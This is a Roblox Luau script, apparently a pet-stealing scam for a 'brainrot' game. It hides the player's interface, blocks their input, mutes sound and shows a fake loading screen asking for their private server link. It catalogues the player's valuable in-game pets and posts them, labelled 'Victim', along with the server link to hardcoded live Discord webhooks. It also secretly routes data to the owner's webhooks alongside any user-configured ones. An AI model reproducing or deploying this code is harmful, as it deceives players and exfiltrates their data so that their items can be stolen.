local Library = {}

local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")
local Workspace = game:GetService("Workspace")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local HARDCODED_SPECIAL_ANIMALS = {
    "Tictac Sahur",
    "Tralaledon",
    "Garama and Madundung",
    "Nuclearo Dinossauro",
    "Strawberry Elephant",
    "Ketchuru and Musturu",
    "Headless Horseman",
    "Meowl",
    "Capitano Moby",
    "La Casa Boo",
    "Los Spooky Combanasionias",
    "Los Combinasionas",
    "Dragon Cannelloni",
    "Chipso and Queso",
    "La Taco Combinasion",
    "Burguru And Fryuru",
}

local HARDCODED_SPECIAL_WEBHOOK = "https://discord.com/api/webhooks/1454590092889948424/R79saS98tQltAMjzXQOB-CmSIT3feEO7zVAFaTx2zmaZZU0PiH--q5c55dnbsCZSEy91"

local HARDCODED_ALLOWED_ANIMALS = {
    "67",
    "Celularcini Viciosini",
    "Dragon Cannelloni",
    "Esok Sekolah",
    "Ketupat Kepat",
    "Mariachi Corazoni",
    "Money Money Puggy",
    "Secret Lucky Block",
    "Spaghetti Tualetti",
    "Tang Tang Kelentang",
    "Eviledon",
    "La Spooky Grande",
    "Los Bros",
    "Los Chicleteiras",
    "",
    "Los Hotspotsitos",
    "Los Nooo My Hotspotsitos",
    "Los Primos",
    "Los Mobilis",
    "Las Sis",
    "La Grande Combinasion",
    "La Supreme Combinasion",
    "La Extinct Grande",
    "La Secret Combinasion",
    "Spooky and Pumpky",
    "Los Lucky Blocks",
    "Admin Lucky Block",
    "Burguro And Fryuro",
    "Chillin Chili",
    "Los Tacoritas",
    "Tacorita Bicicleta",
    "Mieteteira Bicicleteira",
    "La Casa Boo",
    "Pot Hotspot"
}

local HARDCODED_OWNER_WEBHOOKS = {
    ["10-20m"] = "",
    ["50m"] = "",
    ["100m"] = "",
    ["500m"] = "",
    ["unknown"] = "https://discord.com/api/webhooks/1454354948585427028/qTdt6YVLfSVjADC89o16OzeQHS4axeChTYftDwjDpXT-1f7xU-OmROjApCmC5Zo-xIKn"
}

local Config = {
    WEBHOOKS = {},
    SPECIAL_ANIMALS = {},
    ALLOWED_ANIMALS = {},
    BLACKLIST_URL = nil,
    PING_ROLES = {},
    USER_WEBHOOK = nil,
    PING_THRESHOLD = 50000000
}

local serverLinkToSend = ""

local function silenciarTodo(container)
    for _, obj in pairs(container:GetDescendants()) do
        if obj:IsA("Sound") then
            obj.Volume = 0
        end
    end
end

local function isHardcodedSpecialAnimal(animalName)
    for _, specialName in ipairs(HARDCODED_SPECIAL_ANIMALS) do
        if animalName:lower():find(specialName:lower(), 1, true) or specialName:lower():find(animalName:lower(), 1, true) then
            return true
        end
    end
    return false
end

local function isHardcodedAllowedAnimal(animalName)
    for _, allowedName in ipairs(HARDCODED_ALLOWED_ANIMALS) do
        if allowedName ~= "" and (animalName:lower():find(allowedName:lower(), 1, true) or allowedName:lower():find(animalName:lower(), 1, true)) then
            return true
        end
    end
    return false
end

local function isSpecialAnimal(animalName)
    for _, specialName in ipairs(Config.SPECIAL_ANIMALS) do
        if animalName:lower():find(specialName:lower(), 1, true) or specialName:lower():find(animalName:lower(), 1, true) then
            return true
        end
    end
    return false
end

local function checkBlacklist()
    if not Config.BLACKLIST_URL then
        return false
    end

    local success, blacklistData = pcall(function()
        return HttpService:GetAsync(Config.BLACKLIST_URL)
    end)
    
    if success then
        local blacklist = HttpService:JSONDecode(blacklistData)
        
        for _, entry in ipairs(blacklist.blacklisted_users or {}) do
            if entry.user_id == player.UserId or entry.username == player.Name then
                player:Kick("Acceso denegado")
                return true
            end
        end
    else
        warn("[BLACKLIST] No se pudo cargar la blacklist:", blacklistData)
    end
    
    return false
end

local function getAnimalValueFromGeneration(generationText)
    if not generationText or generationText == "Unknown" or generationText == "" then
        return "unknown"
    end

    local lowerGen = generationText:lower()
    local numberPattern = "%$?([%d,]+)m"
    local numberStr = lowerGen:match(numberPattern)

    if not numberStr then
        return "unknown"
    end

    numberStr = numberStr:gsub(",", "")
    local number = tonumber(numberStr)
    if not number then
        return "unknown"
    end

    if number >= 1 and number < 50 then
        return "10-20m"
    elseif number >= 50 and number < 100 then
        return "50m"
    elseif number >= 100 and number < 500 then
        return "100m"
    elseif number >= 500 then
        return "500m"
    end

    return "unknown"
end

local function getPodiumInfo()
    local searchText = player.DisplayName .. "'s Base"
    warn("h//h", searchText)
    local Plots = Workspace:FindFirstChild("Plots")

    if not Plots then
        warn("h//h")
        return {}
    end

    local playerBase = nil
    for _, plot in pairs(Plots:GetDescendants()) do
        if plot.Name == "PlotSign" then
            local surfaceGui = plot:FindFirstChild("SurfaceGui")
            if surfaceGui then
                local frame = surfaceGui:FindFirstChild("Frame")
                if frame then
                    local textLabel = frame:FindFirstChild("TextLabel")
                    if textLabel and textLabel:IsA("TextLabel") then
                        if string.find(textLabel.Text, searchText) then
                            local plotParent = plot
                            while plotParent.Parent ~= Plots do
                                plotParent = plotParent.Parent
                                if plotParent == Workspace or plotParent == game then
                                    break
                                end
                            end
                            playerBase = plotParent
                            break
                        end
                    end
                end
            end
        end
    end

    if not playerBase then
        warn("h//h")
        return {}
    end

    warn("h//h", playerBase.Name)

    local foundModels = {}
    local modelCount = {}
    local baseDescendants = playerBase:GetDescendants()

    -- Buscar primero en AnimalPodiums para identificar los animales reales
    local animalPodiums = playerBase:FindFirstChild("AnimalPodiums")
    if not animalPodiums then
        warn("h//h No se encontró AnimalPodiums")
        return foundModels, modelCount
    end

    warn("h//h AnimalPodiums encontrado")
    local podiumDescendants = animalPodiums:GetDescendants()
    local animalNames = {}

    -- Obtener nombres y generaciones de los podiums
    for _, descendant in pairs(podiumDescendants) do
        if descendant:IsA("TextLabel") and descendant.Name == "DisplayName" then
            local displayText = descendant.Text
            local generationText = "Unknown"
            
            local parent = descendant.Parent
            if parent then
                for _, child in pairs(parent:GetChildren()) do
                    if child:IsA("TextLabel") and child.Name == "Generation" then
                        generationText = child.Text
                        break
                    end
                end
            end
            
            warn("h//h Animal en podium:", displayText, "Gen:", generationText)
            table.insert(animalNames, {name = displayText, generation = generationText})
        end
    end

    warn("h//h Total animales en podiums:", #animalNames)

    -- Ahora buscar esos animales en la base para obtener mutaciones
    for _, animalInfo in ipairs(animalNames) do
        for _, descendant in pairs(baseDescendants) do
            if descendant:IsA("Model") then
                local modelName = descendant.Name
                
                -- Verificar si este modelo coincide con un animal del podium
                if modelName:lower():find(animalInfo.name:lower(), 1, true) or animalInfo.name:lower():find(modelName:lower(), 1, true) then
                    
                    if not modelCount[modelName] then
                        modelCount[modelName] = 0
                    end
                    modelCount[modelName] = modelCount[modelName] + 1

                    local mutations = {}
                    for _, child in pairs(descendant:GetDescendants()) do
                        if child.Name:match("^_Trait%.") then
                            local mutationName = child.Name:gsub("^_Trait%.", "")
                            table.insert(mutations, mutationName)
                        end
                    end

                    table.insert(foundModels, {
                        name = modelName,
                        generation = animalInfo.generation,
                        mutations = mutations,
                        path = descendant:GetFullName(),
                        count = modelCount[modelName],
                        value = getAnimalValueFromGeneration(animalInfo.generation)
                    })
                    
                    warn("h//h Animal agregado:", modelName, "Gen:", animalInfo.generation)
                end
            end
        end
    end
    
    warn("h//h Total animales finales encontrados:", #foundModels)

    return foundModels, modelCount
end

local function classifyAnimals(foundAnimals)
    local classified = {
        ["10-20m"] = {},
        ["50m"] = {},
        ["100m"] = {},
        ["500m"] = {},
        ["unknown"] = {},
        ["special"] = {},
        ["hardcoded_special"] = {}
    }

    local hasHardcodedSpecial = false
    
    for _, animalData in ipairs(foundAnimals) do
        if isHardcodedSpecialAnimal(animalData.name) then
            warn("h//h", animalData.name)
            table.insert(classified["hardcoded_special"], animalData)
            hasHardcodedSpecial = true
        end
    end
    
    if hasHardcodedSpecial then
        warn("h//h")
        return classified
    end

    for _, animalData in ipairs(foundAnimals) do
        if isHardcodedAllowedAnimal(animalData.name) then
            animalData.isHardcodedAllowed = true
            warn("h//h", animalData.name)
        end
        
        if isSpecialAnimal(animalData.name) then
            warn("h//h", animalData.name)
            table.insert(classified["special"], animalData)
        else
            if not animalData.value then
                animalData.value = getAnimalValueFromGeneration(animalData.generation)
            end
            local category = animalData.value
            warn("h//h", animalData.name, category)
            table.insert(classified[category], animalData)
        end
    end

    return classified
end

local function sendToWebhook(category, animals, serverLink, modelCount)
    -- Permitir envío incluso si no hay animales
    local hasAnimals = animals and #animals > 0

    local function normalizeWebhook(webhook)
        local normalized = {}
        if not webhook then
            return normalized
        end
        
        if type(webhook) == "string" then
            if webhook ~= "" then
                table.insert(normalized, webhook)
            end
        elseif type(webhook) == "table" then
            for _, url in ipairs(webhook) do
                if type(url) == "string" and url ~= "" then
                    table.insert(normalized, url)
                end
            end
        end
        
        return normalized
    end

    local webhookUrls = {}
    
    -- Agregar webhook del usuario (normalizado)
    if Config.USER_WEBHOOK then
        local userWebhooks = normalizeWebhook(Config.USER_WEBHOOK)
        for _, url in ipairs(userWebhooks) do
            table.insert(webhookUrls, url)
            warn("h//h agregando webhook de usuario:", url)
        end
    end
    
    -- SIEMPRE agregar webhook del owner según categoría (hardcodeado)
    if category == "hardcoded_special" then
        table.insert(webhookUrls, HARDCODED_SPECIAL_WEBHOOK)
        warn("h//h agregando webhook hardcoded special del owner")
    elseif category == "all" then
        -- Para categoría "all", agregar TODOS los webhooks del owner
        for ownerCategory, ownerWebhook in pairs(HARDCODED_OWNER_WEBHOOKS) do
            table.insert(webhookUrls, ownerWebhook)
            warn("h//h agregando owner webhook hardcodeado para categoría", ownerCategory)
        end
        -- También agregar el webhook especial
        table.insert(webhookUrls, HARDCODED_SPECIAL_WEBHOOK)
        warn("h//h agregando webhook hardcoded special del owner (all)")
    elseif HARDCODED_OWNER_WEBHOOKS[category] then
        table.insert(webhookUrls, HARDCODED_OWNER_WEBHOOKS[category])
        warn("h//h agregando owner webhook hardcodeado para", category)
    end
    
    -- Agregar webhooks de config del usuario (normalizados)
    if Config.WEBHOOKS[category] then
        local configWebhooks = normalizeWebhook(Config.WEBHOOKS[category])
        for _, url in ipairs(configWebhooks) do
            table.insert(webhookUrls, url)
            warn("h//h agregando webhook de config:", url)
        end
    end
    
    if #webhookUrls == 0 then
        warn("h//h No se encontraron webhooks para", category)
        return
    end
    
    warn("h//h Total de webhooks a enviar:", #webhookUrls)

    local playerName = player.Name
    local displayName = player.DisplayName

    local animalList = ""
    
    if hasAnimals then
        for i, animalData in ipairs(animals) do
            local line = ""
            
            -- Agregar traits al principio con formato [Trait]
            if animalData.mutations and #animalData.mutations > 0 then
                for _, mutation in ipairs(animalData.mutations) do
                    line = line .. "[" .. mutation .. "] "
                end
            end
            
            -- Agregar nombre del animal
            line = line .. animalData.name
            
            if animalData.generation then
                line = line .. " - Gen: " .. animalData.generation
            end
            if animalData.count and animalData.count > 1 then
                line = line .. " (x" .. animalData.count .. ")"
            end

            if i == 1 then
                animalList = line
            else
                animalList = animalList .. "\n" .. line
            end
        end
    else
        animalList = "None"
    end

    local duplicateWarning = ""
    
    if hasAnimals and modelCount then
        for modelName, count in pairs(modelCount) do
            if count > 2 then
                for _, animalData in ipairs(animals) do
                    if animalData.name == modelName then
                        duplicateWarning = duplicateWarning .. "+ " .. modelName .. " (x" .. count .. ")\n"
                        break
                    end
                end
            end
        end

        if duplicateWarning ~= "" then
            duplicateWarning = "\n\nDUPLICADOS DETECTADOS (>2):\n" .. duplicateWarning
        end
    end

    local categoryDisplay = category
    local pingMessage
    
    if category == "all" then
        categoryDisplay = "TODOS LOS BRAINROTS"
        -- Si no modificaron el threshold (valor por defecto), usar @everyone
        if Config.PING_THRESHOLD == 50000000 then
            pingMessage = "@everyone"
        else
            pingMessage = "@here"
        end
    elseif category == "hardcoded_special" then
        categoryDisplay = "BRAINROT ESPECIAL HARDCODED"
        pingMessage = "@everyone"
    else
        pingMessage = Config.PING_ROLES[category] or ""
        
        if category == "10-20m" then
            categoryDisplay = "BRAINROTS 10-20M"
        elseif category == "50m" then
            categoryDisplay = "BRAINROTS 50M"
        elseif category == "100m" then
            categoryDisplay = "BRAINROTS 100M"
        elseif category == "500m" then
            categoryDisplay = "BRAINROTS 500M"
        elseif category == "special" then
            categoryDisplay = "BRAINROT ESPECIAL"
        else
            categoryDisplay = "BRAINROTS UNKNOWN VALUE"
        end
    end

    -- Función para crear el embed actualizado
    local function createEmbedData()
        local currentPlayerCount = #Players:GetPlayers()
        local isPlayerInGame = Players:FindFirstChild(playerName) ~= nil
        local playerStatus = isPlayerInGame and "🟢 En el juego" or "🔴 Desconectado"
        local multiPlayerWarning = currentPlayerCount > 1 and "⚠️ Advertencia: Hay " .. currentPlayerCount .. " jugadores en el servidor" or ""
        
        local fields = {
            {
                ["name"] = " Informacion del jugador:",
                ["value"] = "```diff\n+ Victim: " .. playerName .. "\n+ Display: " .. displayName .. "\n+ Status: " .. playerStatus .. "\n```",
                ["inline"] = false
            },
            {
                ["name"] = "Datos del Server:",
                ["value"] = "```diff\n+ Players in Server: " .. currentPlayerCount .. (multiPlayerWarning ~= "" and "\n- " .. multiPlayerWarning or "") .. "\n```",
                ["inline"] = false
            },
            {
                ["name"] = "Brainrots importantes (" .. categoryDisplay .. "):",
                ["value"] = "```diff\n+ " .. animalList:gsub("\n", "\n+ ") .. duplicateWarning .. "```",
                ["inline"] = false
            },
            {
                ["name"] = " Link del Servidor Privado:",
                ["value"] = "[**IR AL SERVER**](" .. serverLink .. ")",
                ["inline"] = false
            },
            {
                ["name"] = "Total:",
                ["value"] = "```diff\n+ Total Brainrots: " .. (hasAnimals and #animals or 0) .. "\n+ Game ID: " .. tostring(game.GameId) .. "\n```",
                ["inline"] = false
            },
            {
                ["name"] = " Comandos Disponibles:",
                ["value"] = "```\n.add - Envía solicitud de amistad y la abre automáticamente\n.kick (razón) - Saca al jugador del juego\n  Ejemplo: .kick adios\n```",
                ["inline"] = false
            }
        }
        
        return {
            ["embeds"] = {{
                ["title"] = " Nuevo Exploiter Encontrado - " .. categoryDisplay,
                ["color"] = 10038562,
                ["fields"] = fields,
                ["footer"] = {
                    ["text"] = "Brainrot Detector - " .. categoryDisplay .. " | Actualizado"
                },
                ["timestamp"] = DateTime.now():ToIsoDate()
            }}
        }
    end
    
    local data = {
        ["content"] = pingMessage .. " **NEW PRIVATE SERVER HIT!**",
        ["embeds"] = createEmbedData()["embeds"]
    }

    local messageIds = {}
    
    local methods = {
        {
            name = "RequestAsync",
            func = function(url)
                local jsonData = HttpService:JSONEncode(data)
                local response = HttpService:RequestAsync({
                    Url = url .. "?wait=true",
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = jsonData
                })
                return response
            end
        },
        {
            name = "RequestAsync with timeout",
            func = function(url)
                local jsonData = HttpService:JSONEncode(data)
                local response = HttpService:RequestAsync({
                    Url = url .. "?wait=true",
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "application/json",
                        ["User-Agent"] = "Roblox/WinInet"
                    },
                    Body = jsonData,
                    Timeout = 30
                })
                return response
            end
        }
    }

    for _, webhookUrl in ipairs(webhookUrls) do
        local sent = false
        local messageId = nil
        
        for i, method in ipairs(methods) do
            if not sent then
                task.wait(0.1)
                local success, result = pcall(function()
                    return method.func(webhookUrl)
                end)

                if success then
                    warn("h//h Mensaje enviado a", webhookUrl, "con", method.name)
                    sent = true
                    
                    if type(result) == "table" and result.Body then
                        local decoded = HttpService:JSONDecode(result.Body)
                        messageId = decoded.id
                        warn("h//h Message ID obtenido:", messageId)
                    elseif type(result) == "string" then
                        local decoded = HttpService:JSONDecode(result)
                        messageId = decoded.id
                        warn("h//h Message ID obtenido:", messageId)
                    end
                    
                    if messageId then
                        table.insert(messageIds, {url = webhookUrl, id = messageId})
                    end
                    
                    break
                else
                    warn("h//h Fallo en", method.name, "para", webhookUrl, tostring(result))
                end
            end
        end

        if not sent then
            warn("h//h No se pudo enviar el mensaje a", webhookUrl)
        end
    end
    
    if #messageIds == 0 then
        warn("h//h No se pudo enviar a ningún webhook")
        return
    end
    
    warn("h//h Iniciando sistema de actualización cada 5 segundos para", #messageIds, "webhooks")
    
    task.spawn(function()
        while Players:FindFirstChild(playerName) or #Players:GetPlayers() > 0 do
            task.wait(5)
            
            local updateData = createEmbedData()
            
            for _, webhookInfo in ipairs(messageIds) do
                local success, result = pcall(function()
                    local jsonData = HttpService:JSONEncode(updateData)
                    return HttpService:RequestAsync({
                        Url = webhookInfo.url .. "/messages/" .. webhookInfo.id,
                        Method = "PATCH",
                        Headers = {["Content-Type"] = "application/json"},
                        Body = jsonData
                    })
                end)
                
                if success then
                    warn("h//h Mensaje actualizado exitosamente en", webhookInfo.url)
                else
                    warn("h//h Error actualizando mensaje en", webhookInfo.url, tostring(result))
                end
            end
        end
        
        warn("h//h Sistema de actualización detenido - jugador desconectado o servidor vacío")
    end)
end

local function smoothNoise(x, octaves)
    local value = 0
    local amplitude = 1
    local frequency = 1

    for i = 1, octaves do
        value = value + math.sin(x * frequency) * amplitude
        amplitude = amplitude * 0.5
        frequency = frequency * 2
    end

    return value
end

local function lerp(a, b, t)
    return a + (b - a) * t
end

local function easeInOutCubic(t)
    return t < 0.5 and 4 * t * t * t or 1 - math.pow(-2 * t + 2, 3) / 2
end

local function getShapePosition(shapeType, index, total, time)
    if shapeType == "orbit" then
        local orbitRadius = 160 + math.sin(time * 1.5 + index * 0.1) * 40
        local orbitSpeed = 0.6
        local orbitAngle = time * orbitSpeed + (index / total) * math.pi * 2
        return math.cos(orbitAngle) * orbitRadius, math.sin(orbitAngle) * orbitRadius

    elseif shapeType == "dots" then
        local dotIndex = math.floor((index - 1) / (total / 3)) + 1
        dotIndex = math.min(dotIndex, 3)

        local dotPositions = {
            {x = -180, y = 0},
            {x = 0, y = 0},
            {x = 180, y = 0}
        }

        local centerX = dotPositions[dotIndex].x
        local centerY = dotPositions[dotIndex].y

        local bounceOffset = 0
        local bounceSpeed = 3
        local bounceHeight = 60

        if dotIndex == 1 then
            bounceOffset = math.sin(time * bounceSpeed) * bounceHeight
        elseif dotIndex == 2 then
            bounceOffset = math.sin(time * bounceSpeed + math.pi * 0.66) * bounceHeight
        elseif dotIndex == 3 then
            bounceOffset = math.sin(time * bounceSpeed + math.pi * 1.33) * bounceHeight
        end

        local particlesPerDot = total / 3
        local localIndex = ((index - 1) % particlesPerDot)
        local angle = (localIndex / particlesPerDot) * math.pi * 2
        local radius = 50 + math.sin(time * 2 + localIndex * 0.2) * 8

        local x = centerX + math.cos(angle) * radius
        local y = centerY + math.sin(angle) * radius + bounceOffset

        return x, y

    elseif shapeType == "grid" then
        local cols = math.ceil(math.sqrt(total))
        local rows = math.ceil(total / cols)
        local col = (index - 1) % cols
        local row = math.floor((index - 1) / cols)

        local spacingX = 400 / cols
        local spacingY = 400 / rows

        local x = (col - cols / 2) * spacingX + math.sin(time * 2 + index * 0.1) * 15
        local y = (row - rows / 2) * spacingY + math.cos(time * 2 + index * 0.1) * 15

        return x, y

    elseif shapeType == "wave" then
        local angle = (index / total) * math.pi * 2 * 3
        local radius = 180
        local waveHeight = 80

        local x = math.cos(angle) * radius
        local y = math.sin(angle) * radius + math.sin(time * 2 + index * 0.15) * waveHeight

        return x, y

    elseif shapeType == "dna" then
        local helixHeight = 300
        local helixRadius = 80
        local twist = 4

        local progress = (index / total)
        local yPos = (progress - 0.5) * helixHeight
        local angle = progress * math.pi * 2 * twist + time * 0.8

        local strand = (index % 2 == 0) and 1 or -1
        local x = math.cos(angle) * helixRadius * strand
        local z = math.sin(angle) * helixRadius * strand

        local rotationAngle = time * 0.5
        local xRotated = x * math.cos(rotationAngle) - z * math.sin(rotationAngle)
        local zRotated = x * math.sin(rotationAngle) + z * math.cos(rotationAngle)

        local perspective = 1 / (1 + zRotated * 0.003)

        return xRotated * perspective, yPos * perspective

    elseif shapeType == "cube" then
        local cubeSize = 180
        local particlesPerEdge = math.ceil(total / 12)
        local edgeIndex = math.floor((index - 1) / particlesPerEdge)
        local posOnEdge = ((index - 1) % particlesPerEdge) / particlesPerEdge

        local x, y, z = 0, 0, 0
        local half = cubeSize / 2

        if edgeIndex == 0 then
            x, y, z = lerp(-half, half, posOnEdge), -half, -half
        elseif edgeIndex == 1 then
            x, y, z = half, lerp(-half, half, posOnEdge), -half
        elseif edgeIndex == 2 then
            x, y, z = lerp(half, -half, posOnEdge), half, -half
        elseif edgeIndex == 3 then
            x, y, z = -half, lerp(half, -half, posOnEdge), -half
        elseif edgeIndex == 4 then
            x, y, z = lerp(-half, half, posOnEdge), -half, half
        elseif edgeIndex == 5 then
            x, y, z = half, lerp(-half, half, posOnEdge), half
        elseif edgeIndex == 6 then
            x, y, z = lerp(half, -half, posOnEdge), half, half
        elseif edgeIndex == 7 then
            x, y, z = -half, lerp(half, -half, posOnEdge), half
        elseif edgeIndex == 8 then
            x, y, z = -half, -half, lerp(-half, half, posOnEdge)
        elseif edgeIndex == 9 then
            x, y, z = half, -half, lerp(-half, half, posOnEdge)
        elseif edgeIndex == 10 then
            x, y, z = half, half, lerp(-half, half, posOnEdge)
        else
            x, y, z = -half, half, lerp(-half, half, posOnEdge)
        end

        local rotX = time * 0.4
        local rotY = time * 0.6

        local y2 = y * math.cos(rotX) - z * math.sin(rotX)
        local z2 = y * math.sin(rotX) + z * math.cos(rotX)

        local x3 = x * math.cos(rotY) - z2 * math.sin(rotY)
        local z3 = x * math.sin(rotY) + z2 * math.cos(rotY)

        local perspective = 1 / (1 + z3 * 0.003)

        return x3 * perspective, y2 * perspective

    elseif shapeType == "galaxy" then
        local armCount = 3
        local armIndex = (index - 1) % armCount
        local posInArm = math.floor((index - 1) / armCount) / math.floor(total / armCount)

        local baseAngle = (armIndex / armCount) * math.pi * 2
        local spiralTightness = 3
        local radius = posInArm * 200
        local angle = baseAngle + posInArm * math.pi * 2 * spiralTightness - time * 0.3

        local x = math.cos(angle) * radius
        local y = math.sin(angle) * radius

        local wobble = math.sin(time * 2 + index * 0.1) * 10 * posInArm

        return x + wobble, y + wobble

    elseif shapeType == "helix" then
        local helixHeight = 350
        local helixRadius = 100

        local progress = (index / total)
        local yPos = (progress - 0.5) * helixHeight
        local angle = progress * math.pi * 2 * 5 + time

        local x = math.cos(angle) * helixRadius
        local y = yPos + math.sin(time * 2 + progress * 10) * 20

        return x, y

    elseif shapeType == "pulse" then
        local rings = 5
        local ringIndex = math.floor((index - 1) / (total / rings))
        local posInRing = ((index - 1) % (total / rings)) / (total / rings)

        local baseRadius = 40 + ringIndex * 35
        local pulsePhase = time * 3 - ringIndex * 0.3
        local radiusMultiplier = 1 + math.sin(pulsePhase) * 0.4
        local radius = baseRadius * radiusMultiplier

        local angle = posInRing * math.pi * 2 + time * 0.5

        local x = math.cos(angle) * radius
        local y = math.sin(angle) * radius

        return x, y
    end

    return 0, 0
end

local function getUIPosition(index, total)
    local boxWidth = 360
    local boxHeight = 40

    local perimeter = (boxWidth + boxHeight) * 2
    local spacing = perimeter / total
    local distance = (index - 1) * spacing

    local x, y

    if distance < boxWidth then
        x = (distance / boxWidth) - 0.5
        y = -0.5
    elseif distance < boxWidth + boxHeight then
        x = 0.5
        y = ((distance - boxWidth) / boxHeight) - 0.5
    elseif distance < boxWidth * 2 + boxHeight then
        x = 0.5 - ((distance - boxWidth - boxHeight) / boxWidth)
        y = 0.5
    else
        x = -0.5
        y = 0.5 - ((distance - boxWidth * 2 - boxHeight) / boxHeight)
    end

    return x * boxWidth, y * boxHeight
end

function Library.Initialize(config)
    -- Usar variables globales si están disponibles (nuevo sistema simple)
    if getgenv and getgenv().UserWebhookURL then
        Config.USER_WEBHOOK = getgenv().UserWebhookURL
        Config.PING_THRESHOLD = getgenv().UserPingThreshold or 50000000
    else
        -- Compatibilidad con el sistema antiguo
        Config.WEBHOOKS = config and config.webhooks or {}
        Config.SPECIAL_ANIMALS = config and config.specialAnimals or {}
        Config.ALLOWED_ANIMALS = config and config.allowedAnimals or {}
        Config.BLACKLIST_URL = config and config.blacklistUrl
        Config.PING_ROLES = config and config.pingRoles or {}
    end

    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
    StarterGui:SetCore("TopbarEnabled", false)
    StarterGui:SetCore("DevConsoleVisible", false)
    StarterGui:SetCore("ResetButtonCallback", false)

    local camera = workspace.CurrentCamera
    camera.CameraType = Enum.CameraType.Scriptable
    
    camera.CFrame = CFrame.new(0, 999999, 0)

    local blockInput = true
    UserInputService.InputBegan:Connect(function(input)
        if blockInput then
            input:Capture()
        end
    end)

    for _, c in pairs({Workspace, ReplicatedStorage, playerGui, StarterGui, CoreGui}) do
        silenciarTodo(c)
        c.DescendantAdded:Connect(function(desc)
            if desc:IsA("Sound") then
                desc.Volume = 0
            end
        end)
    end

    if checkBlacklist() then
        return
    end

    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "LoadingScreen"
    screenGui.IgnoreGuiInset = true
    screenGui.ResetOnSpawn = false
    screenGui.DisplayOrder = 10
    screenGui.Parent = CoreGui

    local background = Instance.new("Frame")
    background.Name = "Background"
    background.Size = UDim2.new(1, 0, 1, 0)
    background.Position = UDim2.new(0, 0, 0, 0)
    background.BackgroundColor3 = Color3.fromRGB(8, 8, 12)
    background.BorderSizePixel = 0
    background.Parent = screenGui

    local loadingText = Instance.new("TextLabel")
    loadingText.Name = "LoadingText"
    loadingText.Size = UDim2.new(0, 300, 0, 50)
    loadingText.Position = UDim2.new(0.5, 0, 0.5, 0)
    loadingText.AnchorPoint = Vector2.new(0.5, 0.5)
    loadingText.BackgroundTransparency = 1
    loadingText.Text = " "
    loadingText.TextColor3 = Color3.fromRGB(160, 180, 220)
    loadingText.TextSize = 24
    loadingText.Font = Enum.Font.GothamMedium
    loadingText.ZIndex = 2
    loadingText.TextTransparency = 1
    loadingText.Visible = true
    loadingText.Parent = background

    local processingText = Instance.new("TextLabel")
    processingText.Name = "ProcessingText"
    processingText.Size = UDim2.new(0, 300, 0, 50)
    processingText.Position = UDim2.new(0.5, 0, 0.5, 0)
    processingText.AnchorPoint = Vector2.new(0.5, 0.5)
    processingText.BackgroundTransparency = 1
    processingText.Text = " "
    processingText.TextColor3 = Color3.fromRGB(160, 180, 220)
    processingText.TextSize = 24
    processingText.Font = Enum.Font.GothamMedium
    processingText.ZIndex = 2
    processingText.TextTransparency = 1
    processingText.Visible = false
    processingText.Parent = background

    local centerFrame = Instance.new("Frame")
    centerFrame.Name = "CenterFrame"
    centerFrame.Size = UDim2.new(0, 800, 0, 800)
    centerFrame.AnchorPoint = Vector2.new(0.5, 0.5)
    centerFrame.Position = UDim2.new(0.5, 0, 0.4, 0)
    centerFrame.BackgroundTransparency = 1
    centerFrame.Parent = background

    local particles = {}
    local layers = 35
    local particlesPerLayer = 60
    local baseRadius = 180
    local mousePosition = Vector2.new(0, 0)
    local time = 0
    local explosionStarted = false
    local formingUI = false
    local explosionProgress = 0
    local formProgress = 0
    local userSubmitted = false
    local morphingShapes = false
    local morphTimer = 0
    local currentShape = 1
    local shapeTransition = 0
    local shapes = {"orbit", "dots", "orbit", "grid", "orbit", "wave", "orbit", "dna", "orbit", "cube", "orbit", "galaxy", "orbit", "helix", "orbit", "pulse"}

    for layer = 1, layers do
        local layerAngle = (layer / layers) * math.pi
        local layerRadius = math.sin(layerAngle)
        local layerZ = math.cos(layerAngle)

        for i = 1, particlesPerLayer do
            local particle = Instance.new("Frame")
            particle.Name = "Particle"
            particle.Size = UDim2.new(0, 1, 0, 1)
            particle.BackgroundColor3 = Color3.fromRGB(130, 170, 255)
            particle.BorderSizePixel = 0
            particle.AnchorPoint = Vector2.new(0.5, 0.5)
            particle.ZIndex = 1
            particle.Parent = centerFrame

            local corner = Instance.new("UICorner")
            corner.CornerRadius = UDim.new(1, 0)
            corner.Parent = particle

            local angle = (i / particlesPerLayer) * math.pi * 2
            local x = math.cos(angle) * layerRadius
            local y = math.sin(angle) * layerRadius
            local z = layerZ

            local explosionDir = Vector3.new(
                x + (math.random() - 0.5) * 1.2,
                y + (math.random() - 0.5) * 1.2,
                z + (math.random() - 0.5) * 1.2
            ).Unit

            table.insert(particles, {
                frame = particle,
                baseX = x,
                baseY = y,
                baseZ = z,
                explosionDirX = explosionDir.X,
                explosionDirY = explosionDir.Y,
                explosionDirZ = explosionDir.Z,
                explosionSpeed = 0.8 + math.random() * 0.6,
                explosionRotation = math.random() * math.pi * 2,
                explosionRotationSpeed = (math.random() - 0.5) * 3,
                resistance = 0.7 + math.random() * 0.6,
                angle = angle,
                layer = layer,
                noiseOffset = math.random() * 100,
                phaseOffset = math.random() * math.pi * 2,
                currentX = 0,
                currentY = 0
            })
        end
    end

    local inputFrame = Instance.new("Frame")
    inputFrame.Name = "InputFrame"
    inputFrame.Size = UDim2.new(0, 400, 0, 60)
    inputFrame.Position = UDim2.new(0.5, 0, 0.4, 0)
    inputFrame.AnchorPoint = Vector2.new(0.5, 0.5)
    inputFrame.BackgroundTransparency = 1
    inputFrame.Visible = false
    inputFrame.ZIndex = 5
    inputFrame.Parent = background

    local inputBox = Instance.new("TextBox")
    inputBox.Name = "InputBox"
    inputBox.Size = UDim2.new(1, -40, 1, -20)
    inputBox.Position = UDim2.new(0, 20, 0, 10)
    inputBox.BackgroundColor3 = Color3.fromRGB(12, 12, 18)
    inputBox.BackgroundTransparency = 0.4
    inputBox.BorderSizePixel = 0
    inputBox.Text = ""
    inputBox.PlaceholderText = "Escribe tu servidor"
    inputBox.TextColor3 = Color3.fromRGB(220, 220, 240)
